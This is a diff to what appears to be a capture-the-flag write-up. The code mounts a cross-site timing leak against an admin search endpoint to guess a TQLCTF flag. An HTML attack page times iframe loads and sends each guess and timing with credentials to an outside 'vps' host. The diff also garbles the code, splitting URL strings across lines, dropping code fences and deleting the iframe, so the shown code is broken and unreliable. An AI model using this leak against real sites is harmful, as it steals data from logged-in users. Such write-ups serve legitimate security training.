@@ -31,26 +31,18 @@ if (paste && paste.length > 0) {
 } else {
  return res.json({ status: "fail", data: [] });
 }
-```
-
-
-
-```
 // 伪代码
 for (let i = 0; i < 10; i += 1) {
- let p1 = fetch("https://zedd.zz:1443/admin/searchword?word=flag{aa")
- let p2 = fetch("https://zedd.zz:1443/admin/searchword?word=flag{ab")
+ let p1 = fetch("https://zedd.zz:
+1443/admin/searchword?word=flag{aa")
+ let p2 = fetch("https://zedd.zz:
+1443/admin/searchword?word=flag{ab")
  let diffs = await Promise.all([p1.then(1), p2.then(-1)]);
  if (diffs[0] !== undefined) {
  return diffs[0];
  }
  return diffs[1];
 }
-```
-
-
-
-```
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -64,7 +56,7 @@ for (let i = 0; i < 10; i += 1) {
  </script>
  <script>
  abc = () => {
- const end = Date.now() 
+ const end = Date.now()
  var req = new XMLHttpRequest();
  req.open('get',`http://vps/result?word=TQLCTF{5b2e5a7f&ms=${end - start}`,true);
  req.withCredentials = true;
@@ -73,16 +65,12 @@ for (let i = 0; i < 10; i += 1) {
  </script>
 <!--底部-->
 </head>
-<body>
- <iframe src="https://proxy:443/admin/searchword?word=TQLCTF{5b2e5a7f" onload="abc()"></iframe>
-</body> 
+
+ 
+
 </html>
-```
-
-
-
-```
-const SEARCH_URL = 'https://proxy:443/admin/searchword?word=';
+const SEARCH_URL = 'https://proxy:
+443/admin/searchword?word=';
 
 async function timing(term) {
  let cnt = 0;
